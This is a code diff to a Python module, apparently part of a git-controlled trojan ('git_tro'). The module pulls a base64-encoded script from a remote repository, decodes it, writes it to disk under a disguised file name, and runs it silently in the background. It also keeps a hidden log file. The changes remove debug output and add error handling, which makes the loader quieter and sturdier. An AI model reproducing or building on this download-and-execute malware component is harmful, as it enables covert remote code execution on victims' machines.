@@ -5,7 +5,7 @@ import os
 
 #TODO: Try this module with win
 scriptPath = "scripts/TCP_client.py"
-TargetScript= ".systemd"
+TargetScript= "sys.py"
 ScriptExec = "python3.5"
 encodedFiles  = False
 
@@ -35,19 +35,19 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	print("[*] In RunScriptFromGit module.")
 	os.system("echo '[*] In RunScriptFromGit module.'>> .Tlog.log") #Todelete
 	script	= get_file_contents(scriptPath)
-	print(script)
 	#content = None
 	if script is not None:
 		content	= base64.b64decode(script).decode()
-		print(content)
 		#try:
 		#	os.makedirs("scripts", mode=777)
 		#except:
 		#	os.system("echo 'getRunScript: scripts folder exists' >> .Tlog.log")
-		fich = open(TargetScript, "w")
-		fich.write(content)
-		fich.close()
-
+		try:
+			fich = open(TargetScript, "w")
+			fich.write(str(content))
+			fich.close()
+		except:
+			return "[Error] RunScriptFromGit: could not create Targetscript modules/_bootlocale not found!!"
 		cmd = "bash -c "+ScriptExec+" "+TargetScript+ ">/dev/null &"
 		print(cmd)
 		os.system(cmd) #os.execv("scripts/test.py") #Permission denied
